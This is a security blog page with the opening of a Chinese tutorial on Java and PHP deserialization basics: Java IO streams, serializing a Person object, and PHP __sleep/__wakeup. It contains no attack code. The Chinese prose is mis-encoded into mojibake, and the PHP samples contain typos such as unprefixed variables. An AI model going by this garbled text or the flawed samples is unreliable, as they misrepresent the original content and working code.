<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="CTF,Java,Web,JavaScript,Linux">
    <meta name="description" content="è®°å½•ä¸€äº›å¥‡å¥‡æ€ªæ€ªä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿">
    <meta name="author" content="y1zh3e7">
    
    <title>
        
            Javaå®‰å…¨ååºåˆ—åŒ–é¢„å¤‡å…¨çŸ¥ |
        
        y1â€™s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/logo.jpg">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.jpg","favicon":"/images/logo.jpg","avatar":"/images/avatar.jpg","font_size":"21px","font_family":"STHeiti","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/cover.jpg","description":"ä¸€åªåç‰¢çš„webğŸ¶ || æ‡‚è¿›æ”»çŸ¥é˜²å®ˆï¼Œå…ˆæ­£å‘åé€†å‘","font_color":"#FFFFFF","hitokoto":false},"scroll":{"progress_bar":true,"percent":true}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"yCemvr5nGXrJlWRCN3SLWLLy-MdYXbMMI","appkey":"7gIuYJ9YQk94en6wRudankYd","server_urls":"https://ycemvr5n.api.lncldglobal.com","placeholder":"Hi speak somethingï¼"},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"center","copyright_info":false},"version":"3.6.1"}
    KEEP.language_ago = {"second":"%s ç§’å‰","minute":"%s åˆ†é’Ÿå‰","hour":"%s å°æ—¶å‰","day":"%s å¤©å‰","week":"%s å‘¨å‰","month":"%s ä¸ªæœˆå‰","year":"%s å¹´å‰"}
    KEEP.language_code_block = {"copy":"å¤åˆ¶ä»£ç ","copied":"å·²å¤åˆ¶","fold":"æŠ˜å ä»£ç å—","folded":"å·²æŠ˜å "}
    KEEP.language_copy_copyright = {"copy":"å¤åˆ¶ç‰ˆæƒä¿¡æ¯","copied":"å·²å¤åˆ¶","title":"åŸæ–‡æ ‡é¢˜","author":"åŸæ–‡ä½œè€…","link":"åŸæ–‡é“¾æ¥"}
  </script>
<meta name="generator" content="Hexo 7.0.0-rc1">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="/images/logo.jpg">
                </a>
            
            <a class="logo-title" href="/">
               y1â€™s Blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                é¦–é¡µ
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                å½’æ¡£
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                æ ‡ç­¾
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                åˆ†ç±»
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/links"
                            >
                                å‹é“¾
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                å…³äº
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">é¦–é¡µ</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">å½’æ¡£</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">æ ‡ç­¾</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">åˆ†ç±»</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/links">å‹é“¾</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">å…³äº</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="post-page-container">
        <div class="article-content-container">

            <div class="article-title">
                <span class="title-hover-animation">Javaå®‰å…¨ååºåˆ—åŒ–é¢„å¤‡å…¨çŸ¥</span>
            </div>

            
                <div class="article-header">
                    <div class="avatar">
                        <img src="/images/avatar.jpg">
                    </div>
                    <div class="info">
                        <div class="author">
                            <span class="name">y1zh3e7</span>
                            
                                <span class="author-label">Lv2</span>
                            
                        </div>
                        <div class="meta-info">
                            
<div class="article-meta-info">
    <span class="article-date article-meta-item">
        
            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
        
        <span class="pc">2023-04-21 10:13:57</span>
        <span class="mobile">2023-04-21 10:13</span>
    </span>
    
        <span class="article-update-date article-meta-item">
        <i class="fas fa-file-pen"></i>&nbsp;
        <span class="pc">2023-04-21 10:14:55</span>
    </span>
    
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/WebSec/">WebSec</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Javaååºåˆ—åŒ–</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>7.8k å­—</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>30 åˆ†é’Ÿ</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                        </div>
                    </div>
                </div>
            

            <div class="article-content keep-markdown-body">
                

                <h1 id="JavaåŸç”Ÿåºåˆ—åŒ–-ååºåˆ—åŒ–"><a href="#JavaåŸç”Ÿåºåˆ—åŒ–-ååºåˆ—åŒ–" class="headerlink" title="JavaåŸç”Ÿåºåˆ—åŒ–/ååºåˆ—åŒ–"></a>JavaåŸç”Ÿåºåˆ—åŒ–/ååºåˆ—åŒ–</h1><h1 id="Javaååºåˆ—åŒ–å…¥é—¨ç¯‡"><a href="#Javaååºåˆ—åŒ–å…¥é—¨ç¯‡" class="headerlink" title="Javaååºåˆ—åŒ–å…¥é—¨ç¯‡"></a><strong>Javaååºåˆ—åŒ–å…¥é—¨ç¯‡</strong></h1><h2 id="Java-IO"><a href="#Java-IO" class="headerlink" title="Java IO"></a><strong>Java IO</strong></h2><p>åœ¨å­¦ä¹ Javaååºåˆ—åŒ–ä¹‹å‰æˆ‘ä»¬å…ˆè¦äº†è§£ä¸€ä¸‹Javaçš„è¾“å…¥è¾“å‡ºæµï¼š</p>
<p>javaçš„IOæµåˆ†ä¸ºäº†<strong>æ–‡ä»¶IOæµï¼ˆFileInput/OutputStreamï¼‰å’Œå¯¹è±¡IOæµï¼ˆObjectInput/OutputStreamï¼‰</strong>ï¼Œä»åå­—ä¸Šå°±å¯ä»¥çœ‹å‡ºæ¥ä¸€ä¸ªæ˜¯ç”¨æ¥å¯¹æ–‡ä»¶è¿›è¡Œè¾“å…¥å’Œè¾“å‡ºï¼Œä¸€ä¸ªæ˜¯å¯¹å¯¹è±¡è¿›è¡Œè¾“å…¥å’Œè¾“å‡ºã€‚</p>
<p>æµçš„ä¼ è¾“è¿‡ç¨‹ï¼š</p>
<p>é¦–å…ˆä¸ç®¡æ˜¯è¾“å…¥è¿˜æ˜¯è¾“å‡ºï¼Œä¼ è¾“çš„ä¸¤ç«¯éƒ½æ˜¯æ–‡ä»¶å’Œjavaçš„è¿è¡Œç¨‹åºï¼Œæ‰€ä»¥å¦‚æœæƒ³è¦åœ¨è¿™äºŒè€…ä¹‹é—´è¿›è¡Œä¼ è¾“ï¼Œæˆ‘ä»¬å°±éœ€è¦å°†ä»–ä»¬ä¸¤ä¸ªä¹‹é—´æ­èµ·æ¥ä¸€ä¸ªå¯ä»¥ä¼ è¾“çš„é€šé“ï¼Œè¿™æ ·å°±å¯ä»¥å®ç°æµçš„ä¼ è¾“ã€‚</p>
<ul>
<li>è¾“å‡ºæµï¼ˆOutputStreamï¼‰ï¼š</li>
</ul>
<p>å¦‚æœæˆ‘ä»¬æƒ³å¯¹ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œå†™å…¥æ“ä½œï¼Œé‚£ä¹ˆå®è´¨ä¸Šæ˜¯åœ¨javaç¨‹åºä¸­å°†æµï¼ˆæƒ³è¦å†™å…¥çš„å†…å®¹ï¼‰è¾“å‡ºåˆ°ç›®çš„æ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥æµçš„æ–¹å‘æ˜¯ä»javaè¾“å‡ºåˆ°æ–‡ä»¶ï¼Œä¸¾ä¸ªå¯¹æ–‡ä»¶å†™å…¥ä¸€ä¸ªå¯¹è±¡çš„ä¾‹å­ï¼š</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("filename"));</span><br><span class="line">oos.writeObject(obj);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>é¦–å…ˆç”¨<code>new FileOutputStream</code>åˆ›å»ºä¸€ä¸ªæ–‡ä»¶è¾“å‡ºæµï¼Œå†ç”¨<code>new ObjectOutputStream</code>åˆ›å»ºä¸€ä¸ªå¯¹è±¡è¾“å‡ºæµï¼ˆå› ä¸ºoosæ˜¯å¯¹è±¡è¾“å‡ºæµç±»å‹ï¼‰ï¼Œè¿™æ—¶æˆ‘ä»¬å°±å¯ä»¥åœ¨javaç¨‹åºä¸­å‘å¤–ï¼ˆæ–‡ä»¶ï¼‰è¾“å‡ºæµï¼ˆå†…å®¹ï¼‰äº†ï¼Œç”»æˆå›¾å¤§æ¦‚æ˜¯è¿™æ ·ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209271524379.jpg" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209271524379.jpg"></p>
<p>å½“æˆ‘ä»¬è¦ç»™è¿™ä¸ªæ–‡ä»¶ä¼ ä¸€ä¸ªobjå¯¹è±¡æ—¶ï¼Œå°±ä¼šä»javaç¨‹åºé¡ºç€è¿™æ¡é€šé“è¿›å…¥åˆ°fileä¸­ã€‚</p>
<ul>
<li>è¾“å…¥æµï¼ˆInputStreamï¼‰</li>
</ul>
<p>å…¶å®è¾“å…¥æµå’Œè¾“å‡ºæµæ„å»ºå‡ºä¼ è¾“é€šé“çš„æ–¹æ³•å‡ ä¹æ˜¯ä¸€æ ·çš„ï¼ŒåŒºåˆ«å°±æ˜¯æµçš„è¾“å‡ºæ–¹å‘æ˜¯ä»fileæŒ‡å‘äº†javaç¨‹åºï¼Œæ‰€ä»¥å¦‚æœæƒ³è¦readè¿™ä¸ªæ–‡ä»¶æˆ‘ä»¬å°±è¦ç”¨è¾“å…¥æµå°†fileè¾“å…¥åˆ°javaç¨‹åºä¸­è¿›è¡Œè¯»å–ã€‚</p>
<h2 id="Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹"><a href="#Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹" class="headerlink" title="Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹"></a><strong>Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹</strong></h2><p>é¦–å…ˆä¸ºä»€ä¹ˆè¦è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œåœ¨ç¨‹åºè¿è¡Œç»“æŸåï¼Œè¿™ä¸ªç¨‹åºé‡Œçš„å¯¹è±¡éƒ½ä¼šè¢«åˆ é™¤ï¼Œå¹¶ä¸”å¯¹è±¡çš„æ„æˆå¾ˆå¤æ‚ï¼Œä¼ è¾“èµ·æ¥éå¸¸ä¸æ–¹ä¾¿ã€‚å¦‚æœæˆ‘ä»¬æƒ³è¦è®©æŸäº›å¯¹è±¡æŒä¹…çš„ä¿å­˜ä¸‹æ¥å¹¶åˆ©äºä¼ è¾“ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†è¿™äº›å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–æˆä¸€ä¸²æ•°æ®ï¼Œä¿å­˜åœ¨æŸä¸ªåœ°æ–¹ï¼Œåœ¨éœ€è¦ç”¨åˆ°è¿™ä¸ªå¯¹è±¡æ—¶å†ååºåˆ—åŒ–è®©è¿™ä¸€ä¸²æ•°æ®è¿˜åŸæˆä¸€ä¸ªå¯¹è±¡ã€‚çœ‹åˆ°ä¸€ä¸ªå¾ˆç”ŸåŠ¨çš„æ¯”å–»ï¼Œæƒ³æŠŠä¸€å¼ æ¡Œå­æ¬è¿›é—¨é‡Œï¼Œå¦‚æœä¸èƒ½é€šè¿‡ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†è¿™ä¸ªæ¡Œå­æ‹†å¼€ï¼ˆåºåˆ—åŒ–ï¼‰ï¼Œåœ¨æ¬è¿›å»ä¹‹åå†å°†æ¡Œå­ç»„è£…å›å»ï¼ˆåºåˆ—åŒ–ï¼‰ï¼Œè¿™å°±æ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</p>
<p>ä¸phpååºåˆ—åŒ–ä¸åŒçš„æ˜¯phpåºåˆ—åŒ–å’Œååºåˆ—åŒ–æä¾›äº†å…³é”®å­—<code>serializeå’Œunserialize</code>ï¼Œä½†javaå¹¶æ²¡æœ‰è¿™ç§apiï¼Œæˆ‘ä»¬åˆšæ‰æåˆ°äº†Javaçš„IOï¼Œé‚£ä¹ˆå®ƒå’ŒJavaçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¹‹é—´æœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Œæˆ‘ä»¬åˆšæ‰è¯´åºåˆ—åŒ–å°±æ˜¯å°†å¯¹è±¡è½¬æ¢ä¸ºä¸€ä¸²å­—èŠ‚æ•°æ®å¹¶ä¿å­˜èµ·æ¥ï¼Œé‚£ä¹ˆè¿™ä¸ªè¿‡ç¨‹çš„å®ç°å…¶å®å°±æ˜¯ä¾é javaçš„è¾“å‡ºï¼Œå°†è¿™ä¸ªå¯¹è±¡ä»javaç¨‹åºé‡Œä»¥å­—èŠ‚æ•°æ®æµçš„å½¢å¼è¾“å‡ºåˆ°javaçš„å¤–éƒ¨ï¼Œç›¸å¯¹çš„ååºåˆ—åŒ–å…¶å®å°±æ˜¯ä¾é javaçš„è¾“å…¥ï¼Œå°†javaå¤–çš„å­—èŠ‚æ•°æ®æµè¾“å…¥åˆ°javaç¨‹åºä¸­ï¼Œæœ€ç»ˆç»è¿‡ä¸€äº›å¤„ç†è¿˜åŸä¸ºå¯¹è±¡ã€‚ä¹Ÿå°±æ˜¯è¯´javaä¸­çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ˜¯éœ€è¦å¼€å‘äººå‘˜è‡ªå·±å†™å‡ºæ•´ä¸ªè¿‡ç¨‹ã€‚è¿™é‡Œæä¾›ä¸¤æ®µä½¿ç”¨javaIOè¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ä»£ç ï¼ˆå¦‚æœè¦å®Œæˆæ•´ä¸ªåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œè¿˜éœ€è¦å…¶ä»–æ–¹æ³•å‚ä¸æ„å»ºï¼Œå¦‚readObjectå’ŒwriteObjectï¼Œä¸‹é¢ä¼šæåˆ°ï¼‰ï¼Œå‡è®¾ser.binæ˜¯æˆ‘ä»¬ç”¨æ¥å‚¨å­˜åºåˆ—åŒ–åå­—èŠ‚æ•°æ®æµçš„æ–‡ä»¶ï¼š</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">/** è¦åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ç±» **/</span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class Person implements Serializable {</span><br><span class="line"></span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">    public Person(){</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    // æ„é€ å‡½æ•°</span><br><span class="line">    public Person(String name, int age){</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.age = age;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString(){</span><br><span class="line">        return "Person{" +</span><br><span class="line">                "name='" + name + '\\'' +</span><br><span class="line">                ", age=" + age +</span><br><span class="line">                '}';</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/** åºåˆ—åŒ– **/</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectOutput;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line">public class SerializationTest {</span><br><span class="line">    public static void serialize(Object obj) throws IOException{</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception{</span><br><span class="line">        Person person = new Person("aa",22);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        serialize(person);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/** ååºåˆ—åŒ– **/</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line">public class UnserializeTest {</span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception{</span><br><span class="line">        Person person = (Person)unserialize("ser.bin");</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>è¾“å‡ºåå¯ä»¥å‘ç°åœ¨åºåˆ—åŒ–ä¹‹å‰è¾“å‡ºå¯¹è±¡personå’Œåœ¨ååºåˆ—åŒ–åè¾“å‡ºéƒ½è°ƒç”¨äº†<code>__toString</code>ï¼ŒæˆåŠŸæ„é€ äº†åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</p>
<h2 id="phpå’ŒJavaååºåˆ—åŒ–ä¹‹é—´çš„åŒºåˆ«"><a href="#phpå’ŒJavaååºåˆ—åŒ–ä¹‹é—´çš„åŒºåˆ«" class="headerlink" title="phpå’ŒJavaååºåˆ—åŒ–ä¹‹é—´çš„åŒºåˆ«"></a><strong>phpå’ŒJavaååºåˆ—åŒ–ä¹‹é—´çš„åŒºåˆ«</strong></h2><p>åœ¨phpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¸­æä¾›äº†serializeå’Œunserializeå‡½æ•°ï¼Œå¯ä»¥ç›´æ¥å°†å¯¹è±¡åºåˆ—åŒ–ä¸ºä¸€ä¸²æ•°æ®æˆ–ç›´æ¥å°†ä¸€ä¸²æ•°æ®ååºåˆ—åŒ–ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œç¨‹åºå‘˜åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­æ˜¯æ— æ³•å‚ä¸çš„ï¼Œä½†åœ¨Javaä¸­ï¼Œéœ€è¦ç¨‹åºå‘˜è‡ªå·±æ¥æ„å»ºåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œphpåœ¨ååºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨è§¦å‘<code>__wakeup</code>å‡½æ•°ï¼Œjavaåœ¨ååºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨è§¦å‘<code>readObject</code>æ–¹æ³•ï¼Œè™½ç„¶éƒ½æ˜¯åœ¨ååºåˆ—åŒ–æ—¶è§¦å‘ï¼Œä½†äºŒè€…ä¹‹é—´æœ‰ä¸€äº›ç»†å¾®çš„å·®åˆ«ã€‚</p>
<p>phpååºåˆ—åŒ–ï¼ˆå¯¹ä¸€ä¸ªæ•°æ®åº“é“¾æ¥å¯¹è±¡ååºåˆ—åŒ–ï¼‰ï¼š</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Connection</span><br><span class="line">{</span><br><span class="line">    protected $link;</span><br><span class="line">    private $dsn, $username, $password;</span><br><span class="line"></span><br><span class="line">    public function __construct($dsn, $username, $password)</span><br><span class="line">    {</span><br><span class="line">        $this-&gt;dsn = dsn;</span><br><span class="line">        $this-&gt;username = username;</span><br><span class="line">        $this-&gt;password = password;</span><br><span class="line">        $this-&gt;connect();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    private function connect()</span><br><span class="line">    {</span><br><span class="line">        $this-&gt;link = new PDO($this-&gt;dsn, $this-&gt;username, $this-&gt;password);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>å¦‚æœæˆ‘ä»¬ç›´æ¥è¾“å‡ºåºåˆ—åŒ–åçš„è¿™ä¸ªConnectionç±»çš„å¯¹è±¡ï¼Œå‘ç°è¾“å‡ºä¸ºnullï¼Œé‚£ä¹ˆåœ¨ååºåˆ—åŒ–æ—¶ä¹Ÿæ˜¯nullï¼Œå› ä¸ºåœ¨phpä¸­èµ„æºç±»å‹çš„å¯¹è±¡é»˜è®¤ä¸ä¼šå†™å…¥åºåˆ—åŒ–æ•°æ®ä¸­ã€‚</p>
<p>å¦‚æœæˆ‘ä»¬å°†ä»£ç æ”¹æˆä¸‹é¢è¿™æ ·å°±å¯ä»¥åœ¨åºåˆ—åŒ–ååœ¨<code>$link</code>ä¸­æ‹¿åˆ°ä¸€ä¸ªæ•°æ®åº“è¿æ¥äº†ï¼š</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Connection</span><br><span class="line">{</span><br><span class="line">    protected $link;</span><br><span class="line">    private $dsn, $username, $password;</span><br><span class="line"></span><br><span class="line">    public function __construct($dsn, $username, $password)</span><br><span class="line">    {</span><br><span class="line">        $this-&gt;dsn = dsn;</span><br><span class="line">        $this-&gt;username = username;</span><br><span class="line">        $this-&gt;password = password;</span><br><span class="line">        $this-&gt;connect();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    private function connect()</span><br><span class="line">    {</span><br><span class="line">        $this-&gt;link = new PDO($this-&gt;dsn, $this-&gt;username, $this-&gt;password);</span><br><span class="line">    }</span><br><span class="line">    public function __sleep()</span><br><span class="line">    {</span><br><span class="line">            return array('dsn', 'username', 'password');</span><br><span class="line">    }</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    {</span><br><span class="line">        $this-&gt;connect();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

